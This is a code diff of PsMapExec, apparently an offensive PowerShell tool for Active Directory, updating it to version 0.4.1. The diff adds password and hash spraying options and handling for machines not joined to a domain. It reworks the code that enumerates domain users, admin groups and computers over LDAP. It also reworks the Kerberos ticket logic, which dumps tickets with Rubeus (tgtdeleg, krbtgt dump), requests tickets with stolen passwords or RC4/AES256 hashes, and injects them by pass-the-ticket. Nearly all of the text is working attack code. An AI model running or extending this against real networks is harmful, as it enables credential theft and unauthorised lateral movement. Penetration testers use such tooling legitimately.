@@ -28,46 +28,49 @@ Param(
     [String]$Password = "",
 
     [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
-    [String]$AllDomains = "",
-
-    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
     [String]$UserDomain = "",
 
-    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
     [String]$LocalFileServer = "",
 
-    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
     [String]$Threads = "8",
 
-    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
     [switch]$Force,
 
-    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
     [switch]$LocalAuth,
     
-    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
     [switch]$CurrentUser,
 
-    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
     [switch]$SuccessOnly,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
     [switch]$ShowOutput,
 
-    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
     [String]$Ticket = "",
 
-    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
     [Switch]$AccountAsPassword,
 
-    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
     [Switch]$EmptyPassword,
 
-    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
     [int]$Port = "",
 
+    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
+    [Switch]$NoParse,
+
     [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
-    [Switch]$NoParse
+    [String]$SprayHash = "",
+
+    [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
+    [String]$SprayPassword = ""
 )
 
 # Check for mandatory parameter
@@ -99,7 +102,7 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.4.0"
+Write-Host "0.4.1"
 Write-Host
 
 # If no targets have been provided
@@ -120,6 +123,22 @@ if ($Threads -lt 2){
         Write-Host "Threads value should not be less than 2"
         return
 }
+
+$DomainJoined = $True
+try {[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain() | Out-Null }Catch {$DomainJoined = $False}
+
+if (!$DomainJoined -and $CurrentUser){
+    Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
+    Write-host "The switch -CurrentUser is not applicable when on a non-domain joined system"
+    return
+}
+
+if ($Domain -eq "" -and $DomainJoined -eq $False){
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
+    return
+}
+
 
 if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
@@ -159,7 +178,7 @@ if ($Method -eq "RDP") {
         }
     }
 
-if ($Method -eq "Spray"){$CurrentUser = $True}
+if ($Method -eq "Spray" -and $DomainJoined -eq $True){$CurrentUser = $True}
 if ($Method -eq "GenRelayList"){$CurrentUser = $True}
 
 if ($Method -eq "VNC") {
@@ -171,6 +190,59 @@ if ($Method -eq "VNC") {
         Start-sleep -Seconds 5
     }
  } 
+
+if ($Method -eq "Spray"){
+
+if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq ""){
+Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+Write-Host "We need something to spray"
+Write-Host
+Write-host "PsMapExec -Method Spray -SprayPassword [Password]"
+Write-host "PsMapExec -Method Spray -SprayHash [Hash]"
+Write-host "PsMapExec -Method Spray -AccountAsPassword"
+Write-host "PsMapExec -Method Spray -EmptyPassword"
+return
+
+}
+
+if ($SprayHash -ne "" -and $SprayPassword -ne ""){
+Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+Write-Host "Hash and Password detected"
+return
+
+}
+
+if ($EmptyPassword -and $SprayHash -ne "" -or ($EmptyPassword -and $SprayPassword -ne "")){
+Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+Write-Host "Password or hash value provided with -EmptyPassword"
+return
+
+}
+
+if ($AccountAsPassword -and $SprayHash -ne "" -or ($AccountAsPassword -and $SprayPassword -ne "")){
+Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+Write-Host "Password or hash value provided with -EmptyPassword"
+return
+
+}
+
+if ($AccountAsPassword -and $EmptyPassword){
+Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
+return
+    
+    }
+}
+
+if ($Method -eq "WinRM" -and !$DomainJoined){
+Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"
+
+Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
+return
+
+}
 
 
 
@@ -254,234 +326,6 @@ foreach ($directory in $directories) {
     }
 }
 
-######### Checks if user context is administrative when a session is spawned #########
-$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
-################################################################################################################
-########################################## Domain Target Acquisition ###########################################
-################################################################################################################
-
-
-if ($Method -ne "Spray"){
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.PageSize = 1000
-$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
-
-if ($Targets -eq "Workstations") {
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-
-}
-elseif ($Targets -eq "Servers") {
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-
-}
-elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-
-$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll()
-
-}
-elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-
-
-$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`
-
-}
-
-
-elseif ($Method -ne "Spray"){
-if ($Targets -is [string]) {
-    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
-    if ($ipAddress) {
-        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
-        break
-    }
-    else {
-        
-        if ($Targets -notlike "*.*") {
-            $Targets = $Targets + "." + $Domain
-        }
-        
-        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
-            
-            }
-        }
-    }
-}
-
-
-# Dispose the searcher after use
-$searcher.Dispose()
-
-
-
-################################################################################################################
-############################ Grab interesting users for various parsing functions ##############################
-################################################################################################################
-
-function New-Searcher {
-    $directoryEntry = [ADSI]"LDAP://$domain"
-    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-    $searcher.PageSize = 1000
-    return $searcher
-}
-
-# Fetch enabled users
-$searcher = New-Searcher
-$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
-$searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-
-$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
-$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
-
-# Fetch members of a group
-function Get-GroupMembers {
-    param (
-        [Parameter(Mandatory = $true)]
-        [string]$GroupName
-    )
-
-    $searcher = New-Searcher
-    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
-    $searcher.PropertiesToLoad.AddRange(@("member"))
-    $groups = $searcher.FindAll()
-
-    $members = @()
-
-    foreach ($group in $groups) {
-        $group.Properties["member"] | ForEach-Object {
-            $userDN = $_.ToString()
-            $user = [ADSI]"LDAP://$userDN"
-            $samAccountName = $user.Properties["samaccountname"] -as [array]
-            if ($samAccountName) {
-                $members += $samAccountName[0]
-            }
-        }
-    }
-    
-    return $members
-}
-
-$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
-$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
-$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
-$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
-
-$FQDNDomainName = $domain.ToLower()
-$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
-$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
-$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
-$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
-
-if ($Method -eq "Spray") {
-    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
-        $Targets = $EnabledDomainUsers
-    }
-    elseif ($Targets -in $EnabledDomainUsers) {
-        $EnabledDomainUsers = $Targets
-    }
-    else {
-        $groupMembers = Get-GroupMembers -GroupName $Targets
-        if ($groupMembers.Count -gt 0) {
-            $EnabledDomainUsers = $groupMembers
-        }
-        elseif ($groupMembers.Count -eq 0) {
-            Write-host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-host "Group either does not exist or is empty"
-            return
-        }
-        else {
-            Write-host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Unspecified Error"
-            return
-        }
-    }
-}
-
-
-
-
-# Grab Computer Accounts for spraying
-function Get-ComputerAccounts {
-    $searcher = New-Searcher
-    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
-    
-    try {
-        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
-        return $ComputerSamAccounts
-    } catch {
-        Write-Error "Failed to fetch computer accounts. Error: $_"
-        return $null
-    }
-}
-
-$ComputerSamAccounts = Get-ComputerAccounts
-$searcher.Dispose()
-
-
-
-if (!$LocalAuth){
-if ($Method -ne "RDP"){
-if (!$Force){
-foreach ($EnterpriseAdmin in $EnterpriseAdmins){
-        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
-        if ($splitResult.Count -gt 1) {
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
-        return
-        }
-    }
-}
-
-if (!$Force) {
-    foreach ($DomainAdmin in $DomainAdmins) {
-        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
-        if ($splitResult.Count -gt 1) {
-            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
-            return
-            }
-        }
-    }
-}
-
-if (!$CurrentUser) {
-    if ($Method -ne "GenRelayList") {
-        if ($Method -ne "SessionHunter"){
-         if ($Method -ne "Spray"){
-        try {
-            $directoryEntry = [ADSI]"LDAP://$domain"
-            $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
-            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-            $user = $searcher.FindOne()
-            $domainUser = $user.Properties["samAccountName"]
-        }
-        Catch {
-           
-           if ($Ticket -ne $null){} 
-            elseif (!$DomainUser) {
-                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "Specified username is not a valid domain user"
-                return
-                
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-
-
 ################################################################################################################
 ################################### Loads ticket functions into memory #########################################
 ################################################################################################################
@@ -531,186 +375,436 @@ function Invoke-Rubeus{
     }
 }
 
+
 ################################################################################################################
 ##################################### Ticket logic for authentication ##########################################
 ################################################################################################################
 # Set the userDomain when impersonating a user in one domain for access to an alternate domain
+# Can't remember where I was going with this...
 if ($UserDomain -ne ""){}
 
-
-# Check if the current user is an administrator
+# Check if the current user is an administrator, used for ticket functions
 $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # If CurrentUser is not set to $True, use Rubeus to store the current user's ticket
 if (!$CurrentUser) {
-    # If the method is not RDP
+    
+    # If the method is not RDP proceed
     if ($Method -ne "RDP") {
-        try {
-            $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
-            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-        }
-        Catch {
+        
+        # If the system is domain joined, store the current user ticket into a variable to restore later
+        if ($DomainJoined) {
             try {
-                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "Current user ticket retrieval failed. Trying alternate methods..."
-                Start-Sleep -Seconds 2
-
-                if (!$CheckAdmin) {
-                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
-                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-                    if ($OriginalUserTicket -notlike "doI*") {
-                        Write-Host "[-] " -NoNewline -ForegroundColor "Red"
-                        Write-Host "Unable to retrieve any Kerberos tickets"
-                        return
-                    }
-
-                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                    Write-Host "SUCCESS!"
-                }
-                elseif ($CheckAdmin) {
-                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
-                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
-                    if ($OriginalUserTicket -notlike "doI*") {
-                        Write-Host "[-] " -NoNewline
-                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
-                        return
-                    }
-
-                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                    Write-Host "SUCCESS!"
-                }
+                $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
+                $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
             }
-            Catch {
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "Unable to retrieve any Kerberos tickets"
-                return
+            catch {
+                try {
+                    if (!$CheckAdmin) {
+                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
+                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+
+                        if ($OriginalUserTicket -notlike "doI*") {
+                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                            Write-Host "Unable to retrieve any Kerberos tickets"
+                            return
+                        }
+                    }
+                    elseif ($CheckAdmin) {
+                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
+                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+
+                        if ($OriginalUserTicket -notlike "doI*") {
+                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+                            Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                            return
+                        }
+                    }
+                }
+                catch {
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "Unable to retrieve any Kerberos tickets"
+                    return
+                }
             }
         }
+    }
 
-        # Check if Password or Hash has been provided
-         if ($Ticket -ne ""){ 
-            if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
-            $Ticket = Get-Content -Path $Ticket -Raw}
+    
+    if ($Method -ne "RDP"){
+    # Check if ticket has been provided
+    if ($Ticket -ne "") {
+        if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
+            $Ticket = Get-Content -Path $Ticket -Raw
+        }
 
+        $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"
 
-            $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"
-
-            # Check if an error has occurred
-            if ($ProvidedTicket -like "*/ticket:X*") {
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "Invalid ticket provided"
-                return
-            }
-
-            # Use regular expression to extract the Username
-            $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
-            $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
-            $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
-            $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
-
-            # Display the extracted information
-            Write-Host
+        # Check if an error has occurred
+        if ($ProvidedTicket -like "*/ticket:X*") {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Supplied Ticket Details"
-            
-            if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
-            if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }
-            
-            Write-Host "    - UserName : $TicketUsername"
-            Write-Host "    - Realm    : $TicketRealm"
-            Write-Host "    - Expires  : $TicketExpiry"
-            Write-Host
-            
-            # Attempt to inject the ticket into the current session
-            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
-            if ($InjectTicket -like "*Error 1398*") {
-
-                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-host "Ticket expired"
-                    klist purge | Out-Null
-                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-                        return
-            }
-    }
-       elseif ($Password -ne "") {
-            klist purge | Out-Null
-            
-            if ($UserDomain -ne ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"}
-            elseif ($UserDomain -eq ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"}
-            
-        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect password or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            Write-Host "Invalid ticket provided"
             return
         }
 
-        if ($AskPassword -like "*Unhandled Rubeus exception:*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect password or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            return
-        }
+        # Use regular expression to extract the Username
+        $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
+        $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
+        $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
+        $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
 
-        }
-       elseif ($Hash -ne "") {
-        if ($Hash.Length -eq 32) {
-        klist purge | Out-Null
-        
-        if ($UserDomain -ne ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"}
-        if ($UserDomain -eq ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"}
-        
-        if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect hash or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            return
-        }
-
-        if ($AskRC4 -like "*Unhandled Rubeus exception:*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect hash or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            return
-        }
-    }
-       elseif ($Hash.Length -eq 64) {
-        klist purge | Out-Null
-
-        if ($UserDomain -ne ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"}
-        if ($UserDomain -eq ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"}
-
-        if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect hash or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            return
-        }
-
-        if ($Ask256 -like "*Unhandled Rubeus exception:*"){
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Incorrect hash or username"
-            klist purge | Out-Null
-            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            return
-        }
-    }
-       else {
-        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
-        Write-Host 
+        # Display the extracted information
         Write-Host
-        return
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Supplied Ticket Details"
 
-	        }
+        if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
+        if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }
+
+        Write-Host "    - UserName : $TicketUsername"
+        Write-Host "    - Realm    : $TicketRealm"
+        Write-Host "    - Expires  : $TicketExpiry"
+        Write-Host
+
+        # Attempt to inject the ticket into the current session
+        $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
+        if ($InjectTicket -like "*Error 1398*") {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-host "Ticket expired"
+            klist purge | Out-Null
+            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            return
+        }
+    }
+    elseif ($Password -ne "") {
+        klist purge | Out-Null
+
+        if ($UserDomain -ne "") {
+            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+        } elseif ($UserDomain -eq "") {
+            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+        }
+
+        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Incorrect password or username"
+            klist purge | Out-Null
+            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            return
+        }
+
+        if ($AskPassword -like "*Unhandled Rubeus exception:*") {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Incorrect password or username"
+            klist purge | Out-Null
+            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+            return
+        }
+    }
+    elseif ($Hash -ne "") {
+        if ($Hash.Length -eq 32) {
+            klist purge | Out-Null
+
+            if ($UserDomain -ne "") {
+                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
+            }
+            if ($UserDomain -eq "") {
+                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
+            }
+
+            if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Incorrect hash or username"
+                klist purge | Out-Null
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                return
+            }
+
+            if ($AskRC4 -like "*Unhandled Rubeus exception:*") {
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Incorrect hash or username"
+                klist purge | Out-Null
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                return
+            }
+        }
+        elseif ($Hash.Length -eq 64) {
+            klist purge | Out-Null
+
+            if ($UserDomain -ne "") {
+                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"
+            }
+            if ($UserDomain -eq "") {
+                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+            }
+
+            if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Incorrect hash or username"
+                klist purge | Out-Null
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                return
+            }
+
+            if ($Ask256 -like "*Unhandled Rubeus exception:*") {
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Incorrect hash or username"
+                klist purge | Out-Null
+                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+                return
+            }
+        }
+        else {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
+            Write-Host 
+            Write-Host
+            return
+            
+            }
         }
     }
 }
+
+
+################################################################################################################
+########################################## Domain Target Acquisition ###########################################
+################################################################################################################
+
+Function Bind {
+param ($Domain)
+    $DirectoryEntry = [ADSI]"LDAP://$domain"
+
+if ($DirectoryEntry.distinguishedName) {} else {
+    
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Failed to bind to the domain"
+
+    if (!$DomainJoined){
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Ensure the credentials parameters provided are for a valid account"
+    }
+    continue
+    
+    }
+}
+
+Bind -Domain $Domain
+
+
+function New-Searcher {
+    $directoryEntry = [ADSI]"LDAP://$domain"
+    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+    $searcher.PageSize = 1000
+    return $searcher
+}
+
+if ($Method -ne "Spray"){
+$searcher = New-Searcher
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+
+if ($Targets -eq "Workstations") {
+
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+
+}
+elseif ($Targets -eq "Servers") {
+
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+
+}
+elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
+
+$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$computers = $searcher.FindAll()
+
+}
